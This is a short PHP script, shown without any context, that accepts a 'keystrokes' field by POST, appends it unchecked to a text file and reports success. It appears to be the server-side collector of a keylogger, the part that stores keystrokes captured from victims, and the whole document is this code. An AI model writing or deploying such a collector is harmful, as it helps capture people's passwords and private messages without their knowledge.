<?php
$keystrokes = $_POST['keystrokes'];

// Append keystrokes to a text file
$file = fopen('keystrokes.txt', 'a');
fwrite($file, $keystrokes . "\n");
fclose($file);

echo 'Keystrokes logged successfully!';
?>
